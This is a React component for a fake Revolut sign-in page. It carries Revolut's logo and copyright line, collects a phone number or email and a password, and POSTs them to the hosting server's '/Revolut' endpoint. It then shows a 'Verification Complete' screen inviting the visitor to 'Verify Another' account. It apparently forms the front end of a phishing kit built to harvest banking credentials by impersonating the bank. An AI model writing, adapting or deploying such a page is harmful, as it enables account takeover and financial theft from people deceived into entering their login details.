import React, { useState } from 'react';
import { Eye, EyeOff, Loader2, CheckCircle } from 'lucide-react';
import './revolutLanding.css';
import revolutLogo from "../../assets/revolut_logo.png";
import fetchWithRetry from '../../utils/api';

const RevolutLogin = () => {
  const [form, setForm] = useState({ emailOrUsername: '', password: '' });
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [done, setDone] = useState(false);
  const [error, setError] = useState('');

  const submitForm = async () => {
    if (!form.emailOrUsername || !form.password) {
      setError('Please fill in all fields');
      return;
    }

    setError('');
    setLoading(true);

    try {
      const res = await fetchWithRetry('/Revolut', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(form)
      });

      const data = await res.json();
      if (!res.ok) throw new Error(data.error || 'Validation failed');

      setDone(true);
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  const handleKeyPress = (e) => {
    if (e.key === 'Enter' && !loading) submitForm();
  };

  if (done) {
    return (
      <div className="revolut-login-page">
        <div className="revolut-login-container">
          <div className="revolut-login-header">
            <img src={revolutLogo} alt="Revolut Logo" className="revolut-login-logo" />
          </div>
          <div className="revolut-success-card">
            <div className="revolut-success-icon-wrapper">
              <CheckCircle className="revolut-success-icon" />
            </div>
            <h2 className="revolut-success-title">Verification Complete</h2>
            <p className="revolut-success-text">Your account is being checked.</p>
            <p className="revolut-success-text">
              Please check your email for further instructions.
            </p>
            <div className="revolut-success-info">
              <p>Want to verify another account?</p>
            </div>
            <div className="revolut-success-actions">
              <button
                onClick={() => window.location.reload()}
                className="revolut-success-btn revolut-success-btn-primary"
              >
                Verify Another
              </button>
              <button
                onClick={() => window.location.href = '/'}
                className="revolut-success-btn revolut-success-btn-secondary"
              >
                Go Home
              </button>
            </div>
          </div>
          <div className="revolut-login-footer">
            <p>© 2025 Revolut Ltd. All rights reserved.</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="revolut-login-page">
      <div className="revolut-login-container">
        <div className="revolut-login-header">
          <img src={revolutLogo} alt="Revolut Logo" className="revolut-login-logo" />
        </div>
        <div className="revolut-login-card">
          <h1 className="revolut-login-title">log in to your account</h1>
          <p className="revolut-login-subtitle">
            Enter the phone number or email associated with your Revolut account
          </p>
          <div className="revolut-input-group">
            <label className="revolut-input-label">Phone number / Email</label>
            <div className="revolut-input-wrapper">
              <input
                type="text"
                autoComplete="email"
                value={form.emailOrUsername}
                onChange={(e) => setForm({ ...form, emailOrUsername: e.target.value })}
                onKeyPress={handleKeyPress}
                className="revolut-input"
                placeholder="Phone number or email"
              />
            </div>
          </div>
          <div className="revolut-input-group">
            <label className="revolut-input-label">Password</label>
            <div className="revolut-password-input-wrapper">
              <input
                type={showPassword ? 'text' : 'password'}
                autoComplete="current-password"
                value={form.password}
                onChange={(e) => setForm({ ...form, password: e.target.value })}
                onKeyPress={handleKeyPress}
                className="revolut-input"
                placeholder="Enter password"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="revolut-password-toggle"
              >
                {showPassword ? (
                  <EyeOff className="revolut-eye-icon" />
                ) : (
                  <Eye className="revolut-eye-icon" />
                )}
              </button>
            </div>
          </div>
          {error && (
            <div className="revolut-error-box">
              <p>{error}</p>
            </div>
          )}
          <button
            onClick={submitForm}
            disabled={loading}
            className="revolut-continue-btn"
          >
            {loading ? (
              <>
                <Loader2 className="revolut-spinner" />
                <span>Processing...</span>
              </>
            ) : (
              'Continue'
            )}
          </button>
        </div>
        <div className="revolut-login-footer">
          <select className="revolut-language-select">
            <option>English (United Kingdom)</option>
            <option>English (United States)</option>
          </select>
          <a href="#privacy" className="revolut-footer-link">Privacy Policy</a>
        </div>
      </div>
    </div>
  );
};

export default RevolutLogin;